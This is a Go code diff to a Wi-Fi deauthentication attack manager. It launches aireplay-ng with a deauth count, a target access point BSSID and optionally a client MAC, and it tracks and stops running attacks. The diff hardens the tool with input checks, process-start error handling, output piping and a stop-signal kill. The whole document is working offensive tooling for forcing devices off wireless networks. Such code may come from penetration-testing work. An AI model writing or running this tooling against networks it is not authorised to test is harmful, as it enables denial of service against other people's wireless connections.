@@ -3,6 +3,7 @@ package deauth
 import (
 	"fmt"
 	"log"
+	"os"
 	"os/exec"
 	"sync"
 	"time"
@@ -50,12 +51,18 @@ func (m *Manager) Start(id, targetMAC, bssid, iface string, count int) error {
 		return fmt.Errorf("attack %s already running", id)
 	}
 
+	if iface == "" {
+		return fmt.Errorf("no monitor interface specified")
+	}
+	if bssid == "" {
+		return fmt.Errorf("no BSSID specified")
+	}
+
 	args := []string{
 		"--deauth", fmt.Sprintf("%d", count),
 		"-a", bssid,
 	}
 
-	// If targeting specific client (not broadcast)
 	if targetMAC != "" && targetMAC != "FF:FF:FF:FF:FF:FF" {
 		args = append(args, "-c", targetMAC)
 	}
@@ -63,6 +70,8 @@ func (m *Manager) Start(id, targetMAC, bssid, iface string, count int) error {
 	args = append(args, iface)
 
 	cmd := exec.Command("aireplay-ng", args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
 
 	state := &attackState{
 		attack: Attack{
@@ -78,15 +87,20 @@ func (m *Manager) Start(id, targetMAC, bssid, iface string, count int) error {
 		stop: make(chan struct{}),
 	}
 
+	log.Printf("deauth: starting %s -> %s (bssid: %s, iface: %s, count: %d)", id, targetMAC, bssid, iface, count)
+
+	if err := cmd.Start(); err != nil {
+		return fmt.Errorf("aireplay-ng failed to start: %w", err)
+	}
+
 	m.attacks[id] = state
 
+	// Wait for process to end
 	go func() {
-		log.Printf("deauth: starting attack %s -> %s (bssid: %s, count: %d)", id, targetMAC, bssid, count)
-		err := cmd.Run()
+		err := cmd.Wait()
 		if err != nil {
-			log.Printf("deauth %s: %v", id, err)
+			log.Printf("deauth %s ended: %v", id, err)
 		}
-
 		m.mu.Lock()
 		if s, ok := m.attacks[id]; ok {
 			s.attack.Running = false
@@ -94,15 +108,13 @@ func (m *Manager) Start(id, targetMAC, bssid, iface string, count int) error {
 		m.mu.Unlock()
 	}()
 
-	// If count > 0, it'll stop on its own. If 0 (continuous), wait for manual stop.
-	if count == 0 {
-		go func() {
-			<-state.stop
-			if cmd.Process != nil {
-				cmd.Process.Kill()
-			}
-		}()
-	}
+	// Kill on stop signal
+	go func() {
+		<-state.stop
+		if cmd.Process != nil {
+			cmd.Process.Kill()
+		}
+	}()
 
 	return nil
 }
